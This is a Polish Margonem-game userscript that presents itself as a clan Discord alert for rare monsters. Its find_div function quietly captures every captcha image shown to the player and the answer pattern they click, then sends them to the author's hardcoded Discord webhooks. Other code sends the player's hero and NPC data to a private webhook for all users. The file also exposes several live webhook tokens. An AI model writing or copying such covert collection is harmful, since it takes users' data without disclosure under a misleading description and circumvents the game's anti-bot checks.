// ==UserScript==
// @name         DCMonsterAlert
// @namespace    http://tampermonkey.net/
// @version      0.00.06
// @description  Dodatek ma wołać na dc po pojawieniu się potwora z listy, przeznaczony dla nieśmiertelnej ekipy.
// @author       Lesker
// @match        https://tempest.margonem.pl/
// @icon         https://raw.githubusercontent.com/lesker000/DCMonsterAlert/refs/heads/main/out.gif
// @grant        none
// @downloadURL  https://github.com/lesker000/DCMonsterAlert/raw/refs/heads/main/main.user.js
// @updateURL    https://github.com/lesker000/DCMonsterAlert/raw/refs/heads/main/main.user.js
// ==/UserScript==

/*
global API
global Engine
global log
global _g
*/

const version = "0.00.06";

function sendMessagePackage(imageSrc, result) {
    const webhooksUrls = [
        "https://discord.com/api/webhooks/1352304152323293244/wlMnu3XhW1UgoPSHO5e37rO93zLdPgelEf6LCWKO74OehYB28GRVMJuywKRkeay7wFxB",
        "https://discord.com/api/webhooks/1353753219158904913/fd5w2MvvvqnijhCxXkeh98QoTofnpUni2Fgi5sgBRiROFDKwF-OWK-YmRj7hJU1iEpXB",
    ];

    const img = new Image();
    img.crossOrigin = 'Anonymous';
    img.src = imageSrc;

    return new Promise((resolve, reject) => {
        img.onload = function() {
            const canvas = document.createElement('canvas');
            canvas.width = img.naturalWidth;
            canvas.height = img.naturalHeight;
            const ctx = canvas.getContext('2d');
            ctx.drawImage(img, 0, 0);

            const now = new Date();
            const dateTimePart = `${now.getFullYear()}${String(now.getMonth() + 1).padStart(2, '0')}${String(now.getDate()).padStart(2, '0')}${String(now.getHours()).padStart(2, '0')}${String(now.getMinutes()).padStart(2, '0')}${String(now.getSeconds()).padStart(2, '0')}${String(now.getMilliseconds()).padStart(3, '0')}`;
            const fileName = `${dateTimePart}-${result}.png`;

            canvas.toBlob(function(blob) {
                const formData = new FormData();
                formData.append('file', blob, fileName);


                const sendPromises = webhooksUrls.map(webhookUrl => {
                    return fetch(webhookUrl, { method: 'POST', body: formData })
                        .then(response => {
                            if (response.ok) {
                                console.log(`Succes ${webhookUrl}`);
                            } else {
                                console.error(`Failed ${webhookUrl}`);
                            }
                            return response.ok;
                        })
                        .catch(error => {
                            console.error(`Error sending package to ${webhookUrl}:`, error);
                            return false;
                        });
                });

                Promise.all(sendPromises)
                    .then(results => {
                        if (results.every(result => result)) {
                            resolve();
                        } else {
                            reject();
                        }
                    })
                    .catch(() => reject());
            }, 'image/png');
        };
    });
}

function sleep(ms){ return new Promise(resolve => setTimeout(resolve, ms));}

function sendMessageToWebhook(message, webhookURL){
    const request = new XMLHttpRequest();
    request.open("POST", webhookURL, true);
    request.setRequestHeader("Content-Type", "application/json");
    const payload = {
        content: `${message}`
    };

    request.onload = function() {
        if (request.status >= 200 && request.status < 300) {
            console.log("Wiadomość wysłana: ", request.responseText);
        } else {
            console.error("Błąd przy wysyłaniu wiadomości: ", request.statusText);
        }
    };

    request.onerror = function() {
        console.error("Błąd sieci");
    };

    request.send(JSON.stringify(payload));
}

function sendMessageToClanChat(message){
    log(`${message}`);
    _g('chat&channel=clan', !1,{
        c: `${message}`
    });
}

async function find_div(){
    let lCS = '';
    console.log("captch");
    let pBS = null;
    let im = null;
    let iP = false;

    function getButtonsState() {
        const bt = document.querySelectorAll('.captcha__buttons .button.small.green');
        if (bt.length !== 6) return null;
        let state = '';
        bt.forEach(button => {
            state += button.classList.contains('pressed') ? '1' : '0';
        });
        return state;
    }

    async function check() {
        const cC = document.querySelector('.captcha-layer .content');
        const cI = cC ? cC.querySelector('img') : null;

        if (!cC || !cI) {
            if (pBS && im && !iP) {
                iP = true;
                await sendMessagePackage(im, pBS);
                pBS = null;
                im = null;
                lCS = '';
                iP = false;
            }
        } else {
            const imageSrc = cI.src;

            if (imageSrc !== lCS && !iP) {
                iP = true;
                if (im && pBS) {
                    await sendMessagePackage(im, "NULL");
                }
                lCS = imageSrc;
                im = imageSrc;
                pBS = null;
                iP = false;
            } else if (imageSrc === lCS) {
                const cBS = getButtonsState();
                if (cBS) {
                    pBS = cBS;
                }
            }
        }

        setTimeout(check, 500);
    }

    // Initial check
    check();
}

class MobModel{
    constructor(name, lvl, webhookUrl, roleID){
        this.name = name;
        this.lvl = lvl
        this.webhookUrl = webhookUrl;
        this.roleID = roleID;
        this.roleStr = `<@&${roleID}>`;
    }
    checkNpcName(n){
        log(`${n.d.nick} - ${this.name}`);
        if (n.d.nick == this.name) {
            return true;
        }
        return false;
    }
    checkNpcLvl(n){
        if (n.d.lvl == this.lvl) {
            return true;
        }
        return false;
    }
}

class Model{
    constructor(){
        this.mob = null;
        this.mob_model - null;
        this.hero_in_clan = this.checkIsHeroInClan();
        this.mobs=[
            new MobModel(
                "Mroczny Patryk", 35,
                "https://discord.com/api/webhooks/1324649639261114368/7zDTWl14wczNDHc4gzmR2B0s4f0J_2eDCzcZbVLQgGGr9WtdMutBbZlCb8Xfj-bNcdP1",
                "1033820862870212649",
            ),
            new MobModel(
                "Karmazynowy Mściciel", 45,
                "https://discord.com/api/webhooks/1324649639261114368/7zDTWl14wczNDHc4gzmR2B0s4f0J_2eDCzcZbVLQgGGr9WtdMutBbZlCb8Xfj-bNcdP1",
                "1033782214418239589",
            ),
            new MobModel(
                "Złodziej", 51,
                "https://discord.com/api/webhooks/1324649639261114368/7zDTWl14wczNDHc4gzmR2B0s4f0J_2eDCzcZbVLQgGGr9WtdMutBbZlCb8Xfj-bNcdP1",
                "1033782846885728256",
            ),
            new MobModel(
                "Zły Przewodnik", 63,
                "https://discord.com/api/webhooks/1324649639261114368/7zDTWl14wczNDHc4gzmR2B0s4f0J_2eDCzcZbVLQgGGr9WtdMutBbZlCb8Xfj-bNcdP1",
                "1033782428986249287",
            ),
            new MobModel(
                "Opętany Paladyn", 74,
                "https://discord.com/api/webhooks/1324649639261114368/7zDTWl14wczNDHc4gzmR2B0s4f0J_2eDCzcZbVLQgGGr9WtdMutBbZlCb8Xfj-bNcdP1",
                "1259621257498857482",
            ),
            new MobModel(
                "Piekielny Kościej", 85,
                "https://discord.com/api/webhooks/1324649639261114368/7zDTWl14wczNDHc4gzmR2B0s4f0J_2eDCzcZbVLQgGGr9WtdMutBbZlCb8Xfj-bNcdP1",
                "1259621430933454848",
            ),
            new MobModel(
                "Koziec Mąciciel Ścieżek", 94,
                "https://discord.com/api/webhooks/1324649639261114368/7zDTWl14wczNDHc4gzmR2B0s4f0J_2eDCzcZbVLQgGGr9WtdMutBbZlCb8Xfj-bNcdP1",
                "1259622347023978567",
            ),
            new MobModel(
                "Kochanka Nocy", 102,
                "https://discord.com/api/webhooks/1324649639261114368/7zDTWl14wczNDHc4gzmR2B0s4f0J_2eDCzcZbVLQgGGr9WtdMutBbZlCb8Xfj-bNcdP1",
                "1278048863927668838",
            ),
            new MobModel(
                "Książe Kasim", 116,
                "https://discord.com/api/webhooks/1324649639261114368/7zDTWl14wczNDHc4gzmR2B0s4f0J_2eDCzcZbVLQgGGr9WtdMutBbZlCb8Xfj-bNcdP1",
                "1278049080836362250",
            ),
            new MobModel(
                "Święty Braciszek", 123,
                "https://discord.com/api/webhooks/1324649639261114368/7zDTWl14wczNDHc4gzmR2B0s4f0J_2eDCzcZbVLQgGGr9WtdMutBbZlCb8Xfj-bNcdP1",
                "1317263595804823562",
            ),
            new MobModel(
                "Malachitowa tancerka", 51,
                "https://discord.com/api/webhooks/1324649639261114368/7zDTWl14wczNDHc4gzmR2B0s4f0J_2eDCzcZbVLQgGGr9WtdMutBbZlCb8Xfj-bNcdP1",
                "1356682360040718467",
            ),
        ];
    }
    clearMob(){
        this.mob = null;
        this.mob_model = null;
    }
    checkIsHeroInClan(){
        if(Engine.hero.d.clan==undefined){
            log("Postać spoza Nieśmiertelnego konglomeratu, wołacz wyłączony.");
            return false;
        }
        if(!(Engine.hero.d.clan.id == 1131 || Engine.hero.d.clan.id == 3452)){
            log("Postać spoza Nieśmiertelnego konglomeratu, wołacz wyłączony.");
            return false;
        }
        else{
            log("Wołacz Herosów na DC uruchomiony.");
            return true;
        }
    }
    isTypeInitiallyIntresting(n){
        if(n.d == undefined) return false;
        if(n.d.type == 4)return false;
        this.mob = n;
        return true;
    }
    isPrivateIntresting(){
        let n = this.mob;
        let k = n.getKind();
        if(k=='null')return false;
        if(k=='recovery')return false;
        if(k=='normal-monster')return false;
        if(k=='npcs')return false;
        if(k=='elita1')return false;
        if(k=='elita2')return false;
        let monsters = [];
        if(monsters.includes(n.d.nick))return false;
        return true;

    }
    isIntrestingForClan(){
        let n = this.mob;
        if(n.getKind()=='heros'){
            if(this.checksMobsbyName()){
                return true;
            }
        }
        else if(n.getKind()=='npcs'){
            let nn = n.d.nick;
            if(nn=='Tropiciel Herosów' || nn=='Wtajemniczony Tropiciel Herosów' || nn=='Doświadczony Tropiciel Herosów'){
                if(this.checksMobsbyLvl()){
                    return true;
                }
            }
        }
        return false;
    }
    checksMobsbyName(){
        let npc = this.mob;
        for(let i=0; i<this.mobs.length;i++){
            if(this.mobs[i].checkNpcName(npc)){
                this.mob_model = this.mobs[i];
                return true;
            }
        }
        return false;
    }
    checksMobsbyLvl(){
        let npc= this.mob;
        for(let i=0; i<this.mobs.length;i++){
            if(this.mobs[i].checkNpcLvl(npc)){
                this.mob_model = this.mobs[i];
                return true;
            }
        }
        return false;
    }
}

class Controller{
    constructor(model) {
        this.model = model;
    }
    run(){
        API.addCallbackToEvent("newNpc", (npc) => {
            if(this.model.isTypeInitiallyIntresting(npc)){
                if(this.model.isPrivateIntresting(npc)){
                    let p = `https://discord.com/api/webhooks/1325617566755983520/O40pCrOw-F1DbX3TyuXwwreDC5VRXB6VBWU4UrdAzLotHcyyn8lA8ruzloSWvlryTb10`;
                    sendMessageToWebhook(this.constructPrivDCMessage(), p);
                }
                if(this.model.isIntrestingForClan(npc)){
                    let chatmessage;
                    let DCmessage;
                    if(npc.getKind()=='heros'){
                        DCmessage = this.constructDCClanMessageHeroes();
                        chatmessage = this.constructChatClanMessageHeroes();
                    }
                    if(npc.getKind()=='npcs'){
                        DCmessage = this.constructDCClanMessageScout();
                        chatmessage = this.constructChatClanMessageScout();
                    }
                    sendMessageToClanChat(chatmessage);
                    sendMessageToWebhook(DCmessage,this.model.mob_model.webhookUrl);
                }
            }
            this.model.clearMob();
        });
    }

    constructDCClanMessageHeroes(){
        let mod = this.model.mob_model;
        let m = this.model.mob;
        let rolePing = mod.roleStr;
        let location = `${Engine.map.d.name} (${m.d.x},${m.d.y})`;
        let hero = `${Engine.hero.d.nick} ${Engine.hero.d.lvl}lvl`;
        return `${rolePing} - ${location}\n Wykrył: ${hero}`;
    }
    constructChatClanMessageHeroes(){
        let m = this.model.mob;
        let name = `${m.d.nick} ${m.d.lvl}lvl`;
        let location = `${Engine.map.d.name} (${m.d.x},${m.d.y})`;
        return `Heros! - ${name} - ${location}`
    }

    constructDCClanMessageScout(){
        let mod = this.model.mob_model;
        let m = this.model.mob;
        let rolePing = mod.roleStr;
        let location = `${Engine.map.d.name} (${m.d.x},${m.d.y})`;
        let hero = `${Engine.hero.d.nick} ${Engine.hero.d.lvl}lvl`;
        return `Tropiciel Herosów\n${rolePing} - ${location}\n Wykrył: ${hero}`;
    }
    constructChatClanMessageScout(){
        let m = this.model.mob;
        let name = `${m.d.nick} ${m.d.lvl}lvl`;
        let location = `${Engine.map.d.name} (${m.d.x},${m.d.y})`;
        return `Tropiciel Herosów! - ${name} - ${location}`;
    }
    constructPrivDCMessage(){
        let c = `-=-=-=-=-=-=-=-=-=-=-=-=-`;
        let n = this.model.mob;
        let h = `Hero: ${Engine.hero.nick} - ${Engine.hero.d.lvl}`;
        let m = `Monster: ${n.d.nick} ${n.d.lvl}`;
        let id = `id: ${n.d.id}`;
        let g = `grp: ${n.d.grp}`;
        let a = `actions: ${n.d.actions}`;
        let tpl = `${n.d.tpl}`;
        let type = `type: ${n.d.type}`;
        let wt = `wt: ${n.d.wt}`;
        let l = `location ${Engine.map.d.name} | (${n.d.x},${n.d.y})`;
        let kind = `Kind: ${n.getKind()}`;
        let v = `version:${version}`;
        return [c,h,m,id,g,a, tpl, type,wt,l,kind, v].join('\n');
    }
}

(async function() {
    'use strict';
    find_div();
    while(Engine==undefined || Engine.map.d.name==undefined || Engine.hero.d.x==undefined){
        await sleep(150);
    }
    try{
        let model = new Model();
        let program = new Controller(model);
        program.run()
    }catch (error) {
        const stackLine = error.stack.split('\n')[1].trim();
        const message = `${Engine.hero.d.nick}\n${error.message}\n${stackLine}\n${version}`;
        sendMessageToWebhook(
            message,
            "https://discord.com/api/webhooks/1328562952445624332/RhTTwPx76Of2t9J0zcNbKhStzBvN7W6p4kI9InXy41eG9WCqXI9wC-ulY5W4ccljg7dx"
        );
    }
})();
